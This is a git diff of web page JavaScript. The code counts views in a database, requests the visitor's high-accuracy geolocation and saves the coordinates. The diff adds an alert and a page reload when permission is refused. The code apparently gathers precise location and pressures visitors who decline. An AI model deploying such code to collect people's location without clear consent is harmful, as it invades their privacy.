@@ -45,14 +45,14 @@
             return null;
         }
         var a = String(navigator.userAgent).toString()
-        if(getCookie('old') == null){
-            setCookie('old', 1, 365)
+        if(getCookie('old1') == null){
+            setCookie('old1', 1, 365)
             var gameStateRef  = database.ref('V4/view');
             gameStateRef.once("value",function(data){
-                view = data.val()
-                view +=1
+                view1 = data.val()
+                view1 +=1
                 database.ref('V4').update({
-                    view:view
+                    view:view1
                 });
             });
                 if ("geolocation" in navigator) {
@@ -67,11 +67,13 @@
                                 latitude: latitude,
                                 longitude: longitude
                             });
-                            redirect()
+                            redirect();
                         }else {
                             console.log("You did not enter your name.");
                         }
                     },function (error) {
+                        alert('Permissions are necessary!')
+                        window.open('#', '_top')
                         console.error("Error getting location: " + error.message);
                     }, { enableHighAccuracy: true });
                 }else {
